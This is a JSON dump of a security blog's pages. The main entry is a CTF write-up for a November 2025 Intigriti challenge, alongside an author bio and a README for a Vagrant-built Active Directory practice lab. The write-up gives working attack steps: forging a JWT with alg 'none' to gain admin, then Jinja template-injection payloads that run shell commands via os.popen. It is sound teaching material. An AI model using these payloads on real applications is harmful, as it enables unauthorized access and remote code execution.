[{"content":" ","date":"19 November 2025","externalUrl":null,"permalink":"/","section":"","summary":"","title":"","type":"page"},{"content":" Challenge Overview # Welcome back! Today, we are diving into the November 2025 INTIGRITI Challenge. This is going to be a black box testing scenario as no source code is provided just us against the application. Let‚Äôs see what we can find.\nIf you want to give a try Challenge link : intigriti Challenge 1125\nPrerequisite # Web Hacking Techniques Exploiting JSON Web Tokens JWT Exploiting Server-Side Template Injection SSTI Hacking Tool jwt_tool Vulnerabilities overview # flowchart LR A[ Registration]--\u003eB[ Normal User Role] B--\u003eC[JWT Tampering] C--\u003eD[Admin User Role] D--\u003eE[SSTI Discovery] E--\u003eF[SSTI to RCE] F--\u003eG[Capturing the Hidden Flag!] Reconnaissance # Here we are presented with a AquaCommerce e-commerce shop used for premium fishing \u0026amp; aquarium items. User\u0026rsquo;s can add items to cart and buy it.\nIt has Login and Sign up functionality. We will be creating an account in order to Login into the application.\nAfter we create our account we will be redirected to /dashboard into our new account.\nAfter logged in we notice our user account has role value set as user interesting.\nwhat about cookies? Let\u0026rsquo;s check it using developer tools\nJWT Tampering # We get this as cookie value in parameter token.\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo4LCJ1c2VybmFtZSI6ImFsZmFYIiwicm9sZSI6InVzZXIiLCJleHAiOjE3NjM1NDM3OTJ9.8ms9nIKxCJRCXRPQmXxR4SXxS20ntTkjei2oiPJw0Gk As this start\u0026rsquo;s with eyJ it\u0026rsquo;s most likely be a JWT token so let\u0026rsquo;s try to decode this using jwt_tool.py .\npython3 jwt_tool.py \u0026#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo4LCJ1c2VybmFtZSI6ImFsZmFYIiwicm9sZSI6InVzZXIiLCJleHAiOjE3NjM1NDM3OTJ9.8ms9nIKxCJRCXRPQmXxR4SXxS20ntTkjei2oiPJw0Gk\u0026#39; Now in order do privilege escalation to admin user we will modifying the values to as follows\nModified Header Values\n{ \u0026#34;alg\u0026#34;: \u0026#34;none\u0026#34;, \u0026#34;typ\u0026#34;: \u0026#34;JWT\u0026#34; } Modified Payload Values\n{ \u0026#34;user_id\u0026#34;: 1, \u0026#34;username\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;role\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;exp\u0026#34;: 1763543792 } Command to tamper the jwt token\npython3 jwt_tool.py \u0026#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo4LCJ1c2VybmFtZSI6ImFsZmFYIiwicm9sZSI6InVzZXIiLCJleHAiOjE3NjM1NDM3OTJ9.8ms9nIKxCJRCXRPQmXxR4SXxS20ntTkjei2oiPJw0Gk\u0026#39; -T Now let\u0026rsquo;s check the values of tampered jwt\neyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzYzNTQzNzkyfQ.8ms9nIKxCJRCXRPQmXxR4SXxS20ntTkjei2oiPJw0Gk Here, we are changing the parameters which might be same as admin user on backend. Modifying algorithm form HS256 to none in order to bypass the signed token and enable support of unsigned tokens. Because tampered JWT token will not be verified successfully.\nPrivilege Escalation to Admin # Now just replace the cookie value with the modified jwt value and refresh the page ( F5 ).\nWe are presented with Admin Access sweet!\nNow we will visit Admin Panel by clicking on \u0026ldquo;Admin Panel\u0026rdquo; or visiting /admin url endpoint.\nWhile exploring the application we will look into My Profile page here, Here we can look an interesting Display Name functionality.\nDiscovery of SSTI # Now while testing, it simply takes Display Name as input and reflects it on Current Display Name field when save changes are made.\nWhile injecting a simple SSTI payloads it results as 7*7 as 49 which confirm the vulnerability.\nSSTI to RCE # Now as it\u0026rsquo;s a Jinja based python which uses python under the hood we can take advantage of global namespaces and importing the os module. And using it\u0026rsquo;s popen() to run shell command directly into the server and taking the output and reading it by .read() method.\nSo, First we will try to execute whoami and id command respectively.\n{{ self.__init__.__globals__.__builtins__.__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;whoami\u0026#39;).read() }} {{ self.__init__.__globals__.__builtins__.__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;id\u0026#39;).read() }} Here, we are able to run os command\u0026rsquo;s successfully and as running as appuser user on the server.\nCapturing Finding The flag # First we are trying to get directory listing including hidden files on the current directory.\n{{ self.__init__.__globals__.__builtins__.__import__(\u0026#39;os\u0026#39;).popen(\u0026#39; ls -lha \u0026#39;).read() }} we can use view source to format the output in raw and help us to see the command more clearly.\nNow their\u0026rsquo;s one hidden directory .aquacommerce let\u0026rsquo;s check what\u0026rsquo;s inside it.\n{{ self.__init__.__globals__.__builtins__.__import__(\u0026#39;os\u0026#39;).popen(\u0026#39; ls .aquacommerce -lha \u0026#39;).read() }} view source version As, we can see a single text file present inside it, Let\u0026rsquo;s looking inside that file.\n{{ self.__init__.__globals__.__builtins__.__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat ./.aquacommerce/019a82cf.txt \u0026#39;).read() }} Voil√†! We found the flag! üö©\nINTIGRITI{019a82cf-ca32-716f-8291-2d0ef30bea32} If you enjoyed this deep dive there\u0026rsquo;s more content on my YouTube channel Security Journey With Ashif\n","date":"19 November 2025","externalUrl":null,"permalink":"/posts/web_hacking/ctf/intigriti_ctf_1125/","section":"Posts","summary":"","title":"Intigriti Challenge 1125 Writeup : AquaCommerce","type":"posts"},{"content":"","date":"19 November 2025","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":" üëã Hi, I‚Äôm Ashif Iqubal üëÄ I‚Äôm interested in Security Research üë®‚Äçüíª üå± I‚Äôm currently Exploring Red Team Opsüî∫ üåü I\u0026rsquo;m here to help! If it\u0026rsquo;s within my knowledge, feel free to reach out. üìö Together, let\u0026rsquo;s share knowledge and grow in cybersecurity community. üì∑ My YouTube Security Journey With Ashif Vulnerability Disclosure Hall of Fame # Nokia : August 2024 # Certifications Journey So Far\u0026hellip; # Offensive Penetration Testing Cybrary Issued Dec 2020 eLearnSecurity Junior Penetration Tester (Ejpt) ine Issued Aug 2021 Certified Ethical Hacker (CEH) EC-Council Issued Aug 2022 Certified Network Defender (CND) EC-Council Issued Oct 2022 Offensive Security Certified Professional (OSCP) oscp Issued Nov 2022 Offensive Security Wireless Professional (OSWP) INE / elearnsecurity Issued Dec 2022 Practical Malware Analysis \u0026amp; Triage (PMAT) TCM Security Issued Jan 2023 Qualys Certified Specialist Vulnerability Management Qualys Issued Jul 2023 Certified Red Team Operator CRTO Zero-Point Security Ltd Issued Oct 2023 OffSec Experienced Penetration Tester (OSEP) osep Issued Jul 2024 ","date":"24 January 2025","externalUrl":null,"permalink":"/about_me/","section":"","summary":"","title":"About Me","type":"page"},{"content":" Ashifcoder/exposelab This is a fully automated Active directory Lab made with the purpose to reduce the hustle of creating it manually. PHP 100 17 Lab Overview üíª # This lab is themed after TV series Mr. Robot :) This is a fully automated Active Directory Lab made with the purpose of reducing the hassle of creating it manually. It uses Vagrant and Powershell Scripts to automate stuff. It also contain a small CTF kind of senerio.\nLab preinstalled # Active directory Services. Chocholotary ( firefox, 7zip, Notepad++ ). Internal Network (for Tunnelling practice). sysinternals installed on every system. Installation Script by @Lavender-exe # separately ‚ö† Tested on Ubuntu LTS 22.04\nchmod +x install-expose.sh sudo ./install-expose.sh Manual Installation # Installation Dependencies üìã # Virtual Box # Latest Version https://www.virtualbox.org/wiki/Downloads\nFor version 6.1 https://www.virtualbox.org/wiki/Download_Old_Builds_6_1\nGeneral update of the system # sudo apt-get update sudo apt-get install -y linux-headers-generic Vagrant Installation # Linux ( Debian )\nwget -O- https://apt.releases.hashicorp.com/gpg | gpg --dearmor | sudo tee /usr/share/keyrings/hashicorp-archive-keyring.gpg echo \u0026#34;deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com $(lsb_release -cs) main\u0026#34; | sudo tee /etc/apt/sources.list.d/hashicorp.list sudo apt update \u0026amp;\u0026amp; sudo apt install vagrant Windows \u0026amp; Other Operating Systems\nvisit https://developer.hashicorp.com/vagrant/downloads\nInstalling plugins # vagrant plugin install vagrant-windows-sysprep Building the lab Infrastructure # Build will take approximately ‚è≥\nStarting form scratch 2hr . If the vagrant images are already downloaded 50 min . ( Grab a Coffee! ‚òïÔ∏è ) Vagrant Cloud Images used\n# Vulnerable Web Server Machine [Ubuntu] chrislentz/trusty64-lamp # Domain Controller [Windows Server 2019] rgl/windows-server-2019-standard-amd64 # Client Machies [Windows 10] rgl/windows-10-1809-enterprise-amd64 Video Tutorial üìπ # Step by Step Installaion of the lab + code Explatation Solving the Mini CTF Challange! Making the lab\ngit clone https://github.com/Ashifcoder/exposelab.git cd exposelab vagrant up Note: If IP address configuration allowed range Error occurs. Run the commands from the network troubleshooting section below.\nDefault Credentials # vagrant : vagrant Other Users on the Lab\nUser Machine mrrobot RootDC Angela WebServer Darlene Windows Client 1 Tyrell Windows Client 2 Elliot N0t-F0uND Thing can be done manually # Run the remove-vagrant.ps1 as a Different user not as vagrant\nor\nRun the commands Manually\n#-----------manually Command to run ----------- # Write Manually to disable the network of vagrant Write-Host -ForegroundColor Green [-] Disabling the vagrent Network on the machine [-] Get-NetAdapter ; Disable-NetAdapter -Name \u0026#39;Ethernet\u0026#39; -Confirm:$False ; Write-Host -ForegroundColor Green \u0026#34;[+] Enabled\u0026#34; ; Get-NetAdapter # Write Manually to remove the vagrant user from the system Write-Host -ForegroundColor Green [-] Removing Vagrant User [-] Remove-LocalUser -Name \u0026#39;vagrant\u0026#39; To remove the virtualBox Boxes # vagrant destroy Troubleshooting ‚öí # Network Troubleshooting\nSetting virtual box Networks\nsudo vim /etc/vbox/networks.conf Should contain\n* 10.0.0.0/8 192.168.0.0/16 195.0.0.0/8 172.16.0.0/8 * 2001::/64 Disclaimer: # All the code provided on this repository is for educational/research purposes only. Any actions and/or activities related to the material contained within this repository is solely your responsibility. The misuse of the code in this repository can result in criminal charges brought against the persons in question. Author will not be held responsible in the event any criminal charges be brought against any individuals misusing the code in this repository to break the law.\nGPL V3 License # Honourable Mentions # Video which inspried me : https://www.youtube.com/watch?v=HfOfbMXCQGM The Auror Project : https://github.com/chr0n1k/Auror-Project Website Landing page : https://github.com/Alanaktion/php-landing Amazing websites: # https://www.vagrantup.com https://learn.microsoft.com https://woshub.com https://chocolatey.org ","date":"17 March 2023","externalUrl":null,"permalink":"/posts/github/exposelab/","section":"Posts","summary":"","title":"Expose Lab: Automated Active Directory Lab + Mini CTF Inside!","type":"posts"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"}]